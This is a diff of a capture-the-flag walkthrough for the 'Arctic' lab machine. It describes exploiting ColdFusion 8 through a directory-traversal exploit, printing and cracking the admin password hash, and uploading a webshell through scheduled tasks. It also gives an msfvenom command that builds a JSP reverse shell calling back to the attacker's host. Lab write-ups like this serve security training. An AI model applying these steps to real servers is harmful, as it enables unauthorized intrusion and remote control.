@@ -22,13 +22,21 @@ Nmap done: 1 IP address (1 host up) scanned in 145.28 seconds
 Port 8500/tcp looks interesting. FMTP protocol - Internet search showed that it was Flight Message Transfer Protocol, 
 but port 8500/tcp is a port used for ColdFusion MX Server (edition 6) to allow remote access as a web server.
 
-We can go to http://10.10.10.11:8500 and see two folders. Going to http://10.10.10.11:8500/CFIDE/ shows an Administrator folder. 
+We can go to http://10.10.10.11:8500 and see two folders. 
+![Arctic Web Portal](/images/arctic-1.png)
+
+Going to http://10.10.10.11:8500/CFIDE/ shows an Administrator folder. 
 
 But it is a web page with a login. The username is prepopulated with "admin".
 
 Online search showed this exploit - https://www.exploit-db.com/exploits/14641 using directory traversal.
 
-When I tried the exploit, it worked! The password hash was 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03. Tried it crack it online and the first result was https://hashtoolkit.com/decrypt-sha1-hash/2f635f6d20e3fde0c53075a84b68fb07dcec9b03
+When I tried the exploit, it worked! The password hash was 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03. 
+
+![Arctic Password Hash](/images/arctic-2.png)
+
+
+Tried it crack it online and the first result was https://hashtoolkit.com/decrypt-sha1-hash/2f635f6d20e3fde0c53075a84b68fb07dcec9b03
 
 The decrypted password was happyday.
 
@@ -41,9 +49,11 @@ http://10.10.10.11:8500/CFIDE/adminapi/base.cfc?wsdl shows that the coldfusion v
 
 Turns out that Kali or Parrot have a cfm webshell in /usr/share/webshells. 
 
-Using the administrator web portal and "Scheduling tasks" page, I uploaded the cfm webshell and then ran the scheduled task.
+Using the administrator web portal and "Scheduling tasks" page, I uploaded the cfm webshell, saved it to C:\ColdFusion8\wwwroot\CFIDE\cfexec.cfm, and then ran the scheduled task.
 
-It gave a command interface but it did not work much. It kept giving errors.
+![Arctic Scheduled Task](/images/arctic-3.png)
+
+It gave a command interface (at \CFIDE\cfexec.cfm) but it did not work much. It kept giving errors.
 
 So I tried jsp reverse shell, because I read that ColdFusion uses a lot of Java/jsp.
 
@@ -51,7 +61,7 @@ So I tried jsp reverse shell, because I read that ColdFusion uses a lot of Java/
 $msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.9 LPORT=1234 -f raw > shell.jsp
 ```
 
-Again scheduled the task to upload the jsp_reverse_shell to Arctic host, and ran it.
+Again scheduled the task to upload the jsp_reverse_shell to Arctic host, and ran it by browsing to \CFIDE\shell.jsp.
 
 This time it worked.
 
